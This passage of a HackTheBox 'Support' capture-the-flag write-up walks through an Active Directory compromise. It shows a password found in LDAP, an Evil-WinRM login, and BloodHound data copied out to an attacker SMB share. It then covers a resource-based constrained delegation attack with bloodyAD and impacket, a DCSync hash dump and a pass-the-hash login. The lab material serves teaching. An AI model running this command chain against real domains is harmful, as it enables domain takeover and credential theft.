<span id="cb5-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uSNCreated:</span> 12617</span>
<span id="cb5-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">info:</span> Ironside47pleasure40Watchful</span>
<span id="cb5-20"></span>
<span id="cb5-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-22"></span>
<span id="cb5-23"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># DnsAdmins, Users, support.htb</span></span>
<span id="cb5-24"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dn:</span> CN=DnsAdmins,CN=Users,DC=support,DC=htb</span>
<span id="cb5-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> top</span>
<span id="cb5-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">objectClass:</span> group</span>
<span id="cb5-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cn:</span> DnsAdmins</span>
<span id="cb5-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">author:</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"0xPThree"</span></span>
<span id="cb5-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">description:</span> DNS Administrators Group</span>
<span id="cb5-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">distinguishedName:</span> CN=DnsAdmins,CN=Users,DC=support,DC=htb</span>
<span id="cb5-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">instanceType:</span> 4</span>
<span id="cb5-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">whenCreated:</span> 20220528110517.0Z</span>
<span id="cb5-33"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">whenChanged:</span> 20220528110517.0Z</span>
<span id="cb5-34"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uSNCreated:</span> 12487</span>
<span id="cb5-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">uSNChanged:</span> 12489</span>
<span id="cb5-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:</span> DnsAdmins</span></code></pre></div>
<p>We find a bunch of users, as well as the very interesting <code>DnsAdmins</code>. If you’ve done the box <strong>Resolute</strong> you probably remember that DnsAdmin group equals instant privesc to Domain Admin using malicious DLL’s, lets have this in mind for later. However, the obvious important thing here is the comment on user <code>Support</code> - <code>Ironside47pleasure40Watchful</code> which probably is his password.</p>
<p>Try to login with Evil-WinRM on port 5985 and grab user.txt.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support evil-winrm <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> 10.129.146.169 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> support <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> Ironside47pleasure40Watchful</span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>upport<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>ocuments<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">support\support</span></span>
<span id="cb6-5"></span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">*Evil-WinRM*</span> PS C:<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\U</span>sers<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\s</span>upport<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\D</span>esktop<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> cat user.txt</span>
<span id="cb6-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">e950252033bf1ad08e45ce24502e4252</span></span></code></pre></div>
<hr>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>As previously mentioned, lets start by checking groups and privileges.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb7-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\support<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> whoami <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">/</span>all</span>
<span id="cb7-2"></span>
<span id="cb7-3">USER INFORMATION</span>
<span id="cb7-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------</span></span>
<span id="cb7-5"></span>
<span id="cb7-6">User Name       SID</span>
<span id="cb7-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">===============</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=============================================</span></span>
<span id="cb7-8">support\support S-1-5-21-1677581083-3380853377-188903654-1105</span>
<span id="cb7-9"></span>
<span id="cb7-10"></span>
<span id="cb7-11"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">GROUP</span> INFORMATION</span>
<span id="cb7-12"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-----------------</span></span>
<span id="cb7-13"></span>
<span id="cb7-14"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span> Name                                 <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Type</span>             SID                                           Attributes</span>
<span id="cb7-15"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==========================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=============================================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==================================================</span></span>
<span id="cb7-16">Everyone                                   Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-1-0                                       Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-17">BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-18">BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-19">BUILTIN\Pre-Windows <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000</span> Compatible Access Alias            S-1-5-32-554                                  Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-20">NT AUTHORITY\NETWORK                       Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-2                                       Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-21">NT AUTHORITY\Authenticated Users           Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-11                                      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-22">NT AUTHORITY\This Organization             Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-15                                      Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-23">SUPPORT\Shared Support Accounts            <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">Group</span>            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-24">NT AUTHORITY\NTLM Authentication           Well-known <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span> S-1-5-64-10                                   Mandatory <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled by default<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span> Enabled <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">group</span></span>
<span id="cb7-25">Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192</span>
<span id="cb7-26"></span>
<span id="cb7-27"></span>
<span id="cb7-28">PRIVILEGES INFORMATION</span>
<span id="cb7-29"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">----------------------</span></span>
<span id="cb7-30"></span>
<span id="cb7-31">Privilege Name                Description                    State</span>
<span id="cb7-32"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">==============================</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=======</span></span>
<span id="cb7-33">SeMachineAccountPrivilege     Add workstations to domain     Enabled</span>
<span id="cb7-34">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span>
<span id="cb7-35">SeIncreaseWorkingSetPrivilege Increase a <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">process</span> working <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">set</span> Enabled</span></code></pre></div>
<p>We’re not a member of DnsAdmins, so no quick and easy DA. Before enumerating with winPEAS, lets start by looking at the domain using BloodHound / SharpHound.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  BloodHound git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">master</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">✗</span> impacket-smbserver share . <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-smb2support</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb8-3"></span>
<span id="cb8-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Config file parsed</span>
<span id="cb8-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0</span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0</span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Config file parsed</span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Config file parsed</span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Config file parsed</span></code></pre></div>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode powershell code-with-copy"><code class="sourceCode powershell"><span id="cb9-1"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Users\support\Documents<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cd</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks</span>
<span id="cb9-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">copy</span> \\<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.66</span>\share\SharpHound<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ps1</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span></span>
<span id="cb9-3"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">import-module</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\SharpHound<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ps1</span></span>
<span id="cb9-4"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> Invoke-BloodHound <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>CollectionMethod All <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>Domain support<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">htb</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>LDAPUser support <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>LDAPPass Ironside47pleasure40Watchful</span>
<span id="cb9-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span>Evil-WinRM<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">*</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">PS</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">copy</span> C<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">:</span>\Windows\Tasks\20220801232808_BloodHound<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">zip</span> \\<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.10</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">14.66</span>\share\bloodout-out<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">.</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">zip</span></span></code></pre></div>
</section>
<section id="step-2-1" class="level3">
<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
<p>Analyze the BloodHound output and we quickly see that our user (<code>support</code>) has <strong>GenericAll</strong> to computer <code>dc.support.htb</code>. <img src="https://exploit.se/posts/2022-08-02-htb-writeup-support/images/support03.png" class="img-fluid"></p>
<p>To better understand what all different ACL’s mean, we can look on this graph. <img src="https://exploit.se/assets/images/acl-attack-graph.png" class="img-fluid"></p>
<p>From the graph we see that <strong>GenericAll</strong> means we got full rights over the computer, DC. Looking at the bottom row, and the box named Computer we have two main options. 1. RBCD - Resource Based Constrained Delegation 2. Grant DCSync rights</p>
<p>The easiest would be to grant DCSync rights and dump the domain hashes, so lets try that first.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.129.20.215 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> support.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> support <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> Ironside47pleasure40Watchful setDCSync support        </span>
<span id="cb10-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> support SID is: S-1-5-21-1677581083-3380853377-188903654-1105</span>
<span id="cb10-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb10-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ldap3.core.exceptions.LDAPInsufficientAccessRightsResult:</span> LDAPInsufficientAccessRightsResult <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> 50 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> insufficientAccessRights <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> None <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> 00000005: SecErr: DSID-03152DE9, problem 4003 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INSUFF_ACCESS_RIGHTS</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> data 0</span>
<span id="cb10-5"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> modifyResponse <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> None</span></code></pre></div>
<p>But it seems like we dont have the correct access rights, some how. Instead we go for <strong>resource based constrained delegation</strong> to allow us to impersonate any user of the domain. Obviously we will impersonate the Administrator, grab his Silver Ticket, and dump (DCSync) all domain hashes.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Create machine account</span></span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.129.146.169 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> support.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> support <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> Ironside47pleasure40Watchful addComputer p3test passwd123</span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Opening</span> domain SUPPORT...</span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Successfully</span> added machine account p3test$ with password passwd123.</span>
<span id="cb11-5"></span>
<span id="cb11-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Set resource based constrained delegation</span></span>
<span id="cb11-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  bloodyAD git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">./bloodyAD.py</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--host</span> 10.129.146.169 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> support.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> support <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> Ironside47pleasure40Watchful setRbcd p3test$ dc$                 </span>
<span id="cb11-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> p3test$ SID is: S-1-5-21-1677581083-3380853377-188903654-5601</span>
<span id="cb11-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity correctly set</span>
<span id="cb11-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Delegation rights modified successfully!</span>
<span id="cb11-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> p3test$ can now impersonate users on dc$ via S4U2Proxy</span>
<span id="cb11-12"></span>
<span id="cb11-13"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Get silver ticket</span></span>
<span id="cb11-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support impacket-getST <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-spn</span> ldap/dc.support.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-impersonate</span> Administrator <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.129.146.169 support.htb/p3test$:passwd123</span>
<span id="cb11-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb11-16"></span>
<span id="cb11-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> CCache file is not found. Skipping...</span>
<span id="cb11-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Getting TGT for user</span>
<span id="cb11-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Impersonating Administrator</span>
<span id="cb11-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     Requesting S4U2self</span>
<span id="cb11-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span>     Requesting S4U2Proxy</span>
<span id="cb11-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Saving ticket in Administrator.ccache</span>
<span id="cb11-23"></span>
<span id="cb11-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Export admin ticket and verify</span></span>
<span id="cb11-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support export KRB5CCNAME=Administrator.ccache</span>
<span id="cb11-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support klist</span>
<span id="cb11-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ticket</span> cache: FILE:Administrator.ccache</span>
<span id="cb11-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Default</span> principal: Administrator@support.htb</span>
<span id="cb11-29"></span>
<span id="cb11-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Valid</span> starting       Expires              Service principal</span>
<span id="cb11-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">08/02/2022</span> 09:35:02  08/02/2022 19:35:02  ldap/dc.support.htb@SUPPORT.HTB</span>
<span id="cb11-32">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">renew</span> until 08/03/2022 09:35:10</span>
<span id="cb11-33"></span>
<span id="cb11-34"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Dump hashes (DCSync)</span></span>
<span id="cb11-35"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  support impacket-secretsdump dc.support.htb <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-no-pass</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-just-dc</span>                      </span>
<span id="cb11-36"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb11-37"></span>
<span id="cb11-38"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Dumping Domain Credentials <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">domain\uid:rid:lmhash:nthash</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb11-39"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Using the DRSUAPI method to get NTDS.DIT secrets</span>
<span id="cb11-40"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::</span></span>
<span id="cb11-41"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span></code></pre></div>
<p>Lastly pass-the-hash with Evil-WinRM and grab the root flag.</p>
<pre><code>➜  support evil-winrm -i 10.129.146.169 -u Administrator -H bb06cbc02b39abeddd1335bc30b19e26
*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
support\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
577a161395a7c12b0a12570153ef2cdd</code></pre>


</section>
</section>

 ]]></description>
  <category>hackthebox</category>
  <category>windows</category>
  <category>smb</category>
  <category>dnspy</category>
  <category>bloodhound</category>
  <category>bloodyad</category>
  <category>rbcd</category>
  <guid>https://exploit.se/posts/2022-08-02-htb-writeup-support/2022-08-02-htb-writeup-support.html</guid>
  <pubDate>Tue, 02 Aug 2022 00:00:00 GMT</pubDate>
